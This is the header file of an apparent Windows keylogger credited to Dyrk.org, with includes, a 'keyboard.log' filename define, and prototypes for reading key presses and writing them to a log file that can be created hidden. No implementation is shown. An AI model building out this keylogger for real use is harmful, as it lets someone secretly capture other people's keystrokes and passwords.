/*
*
*
*   Minimalist { Windows } KeyLogger
*   (c) Dyrk.org 2019 - 2020
*
*
*/

/*
*
*   Header File
*
*
*
**/
#include <Windows.h>
#include <stdio.h>
#include <sys/stat.h>
#include <ctype.h>

#define _CRT_SECURE_NO_DEPRECATE
#define _KEYLOG_FILENAME_ "keyboard.log"

int getKeyPressed();
bool appendFile(char *filename, char letter);
bool logFileExist(char *filename);
void createFile(char *filename, bool hidden);


